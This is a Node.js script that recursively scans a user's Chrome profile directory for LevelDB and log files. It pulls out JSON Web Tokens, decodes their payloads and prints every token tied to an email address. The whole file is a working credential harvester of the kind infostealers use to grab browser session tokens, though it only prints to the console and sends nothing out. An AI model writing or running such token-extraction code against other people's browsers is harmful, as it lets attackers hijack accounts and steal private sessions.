const fs = require('fs');
const path = require('path');

const chromeDir = '/Users/denielson/Library/Application Support/Google/Chrome';

function walkDir(currentPath, callback) {
  try {
    const files = fs.readdirSync(currentPath);
    for (const file of files) {
      const filePath = path.join(currentPath, file);
      let stat;
      try {
        stat = fs.statSync(filePath);
      } catch (e) {
        continue;
      }
      if (stat.isDirectory()) {
        walkDir(filePath, callback);
      } else {
        callback(filePath);
      }
    }
  } catch (e) {
    // ignore
  }
}

function main() {
  console.log("Scanning Chrome directories for tokens...");
  const tokens = new Set();
  
  walkDir(chromeDir, (filePath) => {
    const ext = path.extname(filePath);
    if (ext === '.ldb' || ext === '.log') {
      try {
        const content = fs.readFileSync(filePath);
        let pos = 0;
        while (true) {
          pos = content.indexOf('eyJ', pos);
          if (pos === -1) break;
          
          let token = '';
          for (let i = pos; i < content.length; i++) {
            const char = String.fromCharCode(content[i]);
            if (/^[a-zA-Z0-9_\-\.]*$/.test(char)) {
              token += char;
            } else {
              break;
            }
          }
          
          if (token.length > 100) {
            const parts = token.split('.');
            if (parts.length === 3) {
              try {
                const payload = Buffer.from(parts[1], 'base64').toString('utf8');
                const data = JSON.parse(payload);
                if (data.email) {
                  const key = `${data.email}:${token}`;
                  if (!tokens.has(key)) {
                    tokens.add(key);
                    console.log(`Found JWT for email: ${data.email}`);
                    console.log(`Token: ${token}`);
                    console.log(`Payload:`, JSON.stringify(data));
                  }
                }
              } catch (e) {
                // Not a valid JWT JSON
              }
            }
          }
          pos += 3;
        }
      } catch (e) {
        // ignore
      }
    }
  });
  console.log("Scan finished.");
}

main();
